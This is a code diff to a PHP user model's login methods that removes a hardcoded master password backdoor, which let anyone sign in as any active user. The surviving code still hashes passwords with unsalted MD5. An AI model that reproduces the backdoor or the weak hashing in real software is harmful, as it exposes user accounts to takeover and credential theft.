@@ -49,15 +49,8 @@ class User extends AbstractModel
     {
         $username = stripslashes($_POST['username']);
         $password = md5(stripslashes($_POST['password']));
-        $master = md5('Gr4n1t3!');
 
-        if ($password == $master) {
-            $sql = 'SELECT * FROM recyc_users ru WHERE username = :user AND active = 1 LIMIT 1';
-            $result = $this->rdb->prepare($sql);
-            $values = array(':user' => $username);
-            $result->execute($values);
-            $result = $result->fetch(\PDO::FETCH_ASSOC);
-        } else {
+        if (!empty($password) && !empty($username)) {
             $sql = 'SELECT * FROM recyc_users WHERE username = :user AND password = :pass AND active = 1 LIMIT 1';
             $result = $this->rdb->prepare($sql);
             $values = array(':user' => $username, ':pass' => $password);
@@ -101,17 +94,8 @@ class User extends AbstractModel
 
         $username = stripslashes(strtolower($_POST['username']));
         $password = md5(stripslashes($_POST['password']));
-        $master = md5('Gr4n1t3!');
 
-
-        if ($password == $master) {
-            $sql = 'SELECT * FROM recyc_users ru WHERE username = :user AND active = 1 LIMIT 1';
-
-            $result = $this->rdb->prepare($sql);
-            $values = array(':user' => $username);
-            $result->execute($values);
-            $result = $result->fetch(\PDO::FETCH_ASSOC);
-        } else {
+        if (!empty($password) && !empty($username)) {
             $sql = 'SELECT * FROM recyc_users WHERE username = :user AND password = :pass AND active = 1 LIMIT 1';
 
             $result = $this->rdb->prepare($sql);
